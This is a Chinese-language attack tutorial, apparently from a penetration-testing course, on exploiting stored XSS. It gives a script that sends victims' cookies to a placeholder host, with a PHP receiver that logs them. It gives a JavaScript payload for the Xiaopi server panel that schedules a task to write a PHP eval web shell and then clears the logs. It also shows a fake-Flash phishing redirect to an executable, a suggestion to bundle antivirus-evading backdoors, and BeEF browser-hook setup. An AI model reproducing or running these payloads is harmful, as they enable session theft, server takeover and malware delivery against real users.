## cookie窃取

### 手工

条件：无防护Cookie凭据获取
利用：XSS平台或手写接受代码
演示：某贷款分配系统存储XSS利用

手工：

```
<script>
	var url='http://xx.xx.xx.xx/getcookie.php?u='+window.location.href+'&c='+document.cookie;
	document.write("<img src="+url+" />");</script>
```

接受：

```
<?php
	$url=$_GET['u'];
	$cookie=$_GET['c'];
	$fp = fopen('cookie.txt',"a");
	fwrite($fp,$url."|".$cookie."\n");
	fclose($fp);
?>
```

### 平台XSSReceiver

简单配置即可使用，无需数据库，无需其他组件支持

## XSS跨站-攻击利用-数据提交

条件：熟悉后台业务功能数据包，利用JS写一个模拟提交

利用：凭据获取不到或有防护无法利用凭据进入时执行其他

演示：小皮面板系统存储XSS提交数据包模拟写入后门文件

参考 http://blog.csdn.net/RestoreJustice/article/details/129735449

```
<script src="http://xx.xxx.xxx/poc.js"></script>

function poc(){

$.get('/service/app/tasks.php?type=task_list',{},function(data){

var id=data.data[0].ID;

$.post('/service/app/tasks.php?type=exec_task',{

tid:id

},function(res2){

$.post('/service/app/log.php?type=clearlog',{

},function(res3){},"json");

},"json");

},"json");

}

function save(){

var data=new Object();

data.task_id="";

data.title="test";

data.exec_cycle="1";

data.week="1";

data.day="3";

data.hour="14";

data.minute = "20";

data.shell='echo "<?php @eval($_POST[123]);?>" >C:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/1.php';

$.post('/service/app/tasks.php?type=save_shell',data,function(res){

poc();

},'json');

}

save();
```

## XSS跨站-攻击利用-网络钓鱼

1、部署可访问的钓鱼页面并修改

2、植入XSS代码等待受害者触发

3、将后门及正常文件捆绑打包免杀

Ps：可在后续红队钓鱼篇章学习钓鱼页面制作

https://github.com/r00tSe7en/Fake-flash.cn

```
<script>alert('当前浏览器Flash版本过低,请下载升级！');location.href='http://x.x.x.x/flash.exe'</script>
```

## XSS跨站-攻击利用-溯源综合

浏览器控制框架-beef-xss

只需执行JS文件，即可实现对当前浏览器的控制，可配合各类手法利用

#### beef安装

在github上 https://github.com/beefproject/beef 下载源代码

传到服务器上

修改config.yaml初始账号密码

给beef执行权限



搭建：docker run --rm -p 3000:3000 janes/beef

访问：http://ip/ui/panel （账号密码：beef/beef）

```
<script src="http://ip:3000/hook.js"></script>  
```